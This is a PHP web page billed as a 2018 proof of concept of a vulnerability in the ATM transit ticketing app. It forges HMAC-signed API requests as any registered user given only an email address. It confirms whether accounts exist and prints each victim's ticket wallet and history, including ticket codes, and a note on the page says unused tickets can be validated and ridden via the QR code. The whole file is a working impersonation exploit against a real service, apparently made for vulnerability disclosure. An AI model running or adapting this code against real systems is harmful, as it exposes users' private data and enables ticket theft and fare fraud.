<?php

/**
 * Generates a HMAC for the given URL and HTTP method.
 * Returns an array with the following keys:
 *     ["secret"]:    the resulting HMAC string
 *     ["timestamp"]: the timestamp to be used in the Timestamp header
 *                    of the request.
 */
function get_auth($url, $method = "GET") {
    preg_match("/https?:\/\/.*?(\/.*?)(?:$|\?(.*))/", $url, $matches);
    $date = new DateTime();
    $date->setTimezone(new DateTimeZone("UTC"));
    $timestamp = $date->format("D, d M Y H:i:s") . " GMT";
    $output["timestamp"] = $timestamp;
    $auth_str = utf8_encode(sprintf("%s\n%s\n%s\n%s",
                                    $method,
                                    $timestamp,
                                    strtolower($matches[1]),
                                    $matches[2]));
    $pwd = utf8_encode(strtoupper(getenv("ATM_SECRET")));
    $output["secret"] = base64_encode(hash_hmac("sha256", $auth_str, $pwd, TRUE));
    return $output;
}

/**
 * Performs a GET request to the given URL, authenticated as the given
 * username.
 */
function get($url, $user = "ATMApp") {
    $auth = get_auth($url);
    $token = sprintf("%s:%s", $user, $auth["secret"]);
    $options = array("http" => array("header" => sprintf("Content-Type: application/json; charset=utf-8\r\nTimestamp: %s\r\nAuthentication: %s\r\n", $auth["timestamp"], $token),
                                     "method" => "GET"));
    $context = stream_context_create($options);
    $result = file_get_contents($url, FALSE, $context);
    return $result;

}

/**
 * Performs a POST request to the given URL and with the given data,
 * authenticated as the given username.
 */
function post($url, $data, $user = "ATMApp") {
    $auth = get_auth($url, "POST");
    $token = sprintf("%s:%s", $user, $auth["secret"]);
    $options = array("http" => array("header" => sprintf("Content-Type: application/json; charset=utf-8\r\nTimestamp: %s\r\nAuthentication: %s\r\n", $auth["timestamp"], $token),
                                     "method" => "POST",
                                     "content" => $data));
    $context = stream_context_create($options);
    $result = file_get_contents($url, FALSE, $context);
    return $result;
}

/**
 * Determines if the given user is registered to ATM's web services.
 */
function validate_user($user) {
    $body = json_encode(array("username" => $user, "password" => "0"));
    $result = post("https://atm-be.sg.engitel.com/v2/it/Membership/ValidateUser", $body);
    return ($result != "1");
}

/**
 * Returns the list of tickets in the given user's wallet.
 */
function get_tickets($user) {
    $output = array();
    // Unused tickets
    $result = @get("https://atm-be.sg.engitel.com/v2/it/ticketing/wallet", $user);
    if ($result != FALSE) {
        $data = json_decode($result, TRUE);
        foreach ($data as $ticket) {
            array_push($output, array("description" => $ticket["Description"],
                                      "duration" => $ticket["DurationDescription"],
                                      "journeys" => $ticket["MaxValidationsAllowed"],
                                      "pnr" => $ticket["MobileTicketId"],
                                      "price" => $ticket["Price"],
                                      "validated" => FALSE,
                                      "validation_date" => NULL,
                                      "expiration_date" => NULL));
        }
    }
    // Already used tickets
    $result = @get("https://atm-be.sg.engitel.com/v2/it/ticketing/walletHistory", $user);
    if ($result != FALSE) {
        $data = json_decode($result, TRUE);
        foreach ($data as $ticket) {
            array_push($output, array("description" => $ticket["Description"],
                                      "duration" => $ticket["DurationDescription"],
                                      "journeys" => $ticket["MaxValidationsAllowed"],
                                      "pnr" => $ticket["MobileTicketId"],
                                      "price" => $ticket["Price"],
                                      "validated" => TRUE,
                                      "validation_date" => $ticket["ValidationTimeStamp"],
                                      "expiration_date" => $ticket["ExpirationTimeStamp"]));
        }
    }
    return $output;
}

/**
 * Pretty-prints the list of tickets in the given user's wallet.
 */
function print_tickets($user) {
    $tickets = get_tickets($user);
    if (empty($tickets)) {
        echo("<h4>Non è presente alcun biglietto nel portafoglio dell'utente <strong>" . htmlspecialchars($user, ENT_QUOTES, 'UTF-8') . "</strong>.</h4>");
        echo("<br /><br />");
    } else {
        echo("<h4>Biglietti dell'utente <strong>" . htmlspecialchars($user, ENT_QUOTES, 'UTF-8') . "</strong>:</h4><br />\n");
        foreach ($tickets as $ticket) {
            echo("<div class='tdt'><b>PNR:</b> <code style='color: black'>" . $ticket["pnr"] . "</code></div>\n");
            echo("<div class='tdt'><b>Descrizione:</b> " . $ticket["description"] . "</div>\n");
            echo("<div class='tdt'><b>Durata:</b> " . $ticket["duration"] . "</div>\n");
            echo("<div class='tdt'><b>Prezzo:</b> " . sprintf("%.2f", $ticket["price"]) . " € </div>\n");
            echo("<div class='tdt'><b>Viaggi:</b> " . $ticket["journeys"] . "</div>\n");
            echo("<div class='tdt'><b>Convalidato:</b> " . ($ticket["validated"] ? "sì" : "no*") . "</div>\n");
            if ($ticket["validated"]) {
                echo("<div class='tdt'><b>Data convalida:</b> " . $ticket["validation_date"] . "</div>\n");
                echo("<div class='tdt'><b>Data scadenza:</b> " . $ticket["expiration_date"] . "</div>\n");
            } else {
                echo("<div class='tdt' style='margin-top: 4px;'><small>*La vulnerabilità consente di convalidare il biglietto e di usarlo tramite il codice QR.</small></div>\n");
            }
            echo("<br /><br />");
        }
    }
}

/**
 * Parses POST parameters and prints the result.
 */
function print_data() {
    if (isset($_POST['submit'])) {
        $user_exists = validate_user($_POST['user']);
        if (! $user_exists) {
            echo("<h4>L'utente <strong>" . htmlspecialchars($_POST['user'], ENT_QUOTES, 'UTF-8') . "</strong> non risulta registrato al sito.</h4>");
            echo("<br /><br />");
        } else {
            print_tickets($_POST['user']);
        }
    }
}

?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Proof of concept vulnerabilità app ATM</title>
        <link href="css/bootstrap.css" rel="stylesheet" media="screen">
        <style type="text/css">
            body {
                padding-top: 20px;
                padding-left: 40px;
                padding-right: 40px;
                padding-bottom: 100px;
            }

            .tdt {
                margin-left: 30px;
            }
        </style>
    </head>
    <body>
        <h2>Proof of concept vulnerabilità app ATM</h2>
        <h6 style="margin-bottom: 30px;">© 2018 Jacopo Jannone</h6>
        <hr>
        <div style="margin-top: 30px;">
            <?php print_data(); ?>
            <h5 style='margin-bottom: 15px;'>Inserire l'indirizzo e-mail di un utente registrato al sito di ATM:</h5>
            <form action='' method='post'>
                <div class="input-group mb-3" style="padding-left: 0;">
                    <input name='user' type='email' required='true' placeholder='mario.rossi@esempio.com' class="form-control" style="max-width: 400px;"/>
                    <div class="input-group-append">
                        <input type='submit' name='submit' value='Invia' class="btn btn-outline-secondary rounded-right" />
                    </div>
                <div>
            </form>
        </div>
        <script src="//code.jquery.com/jquery.js"></script>
        <script src="js/bootstrap.min.js"></script>
    </body>
</html>
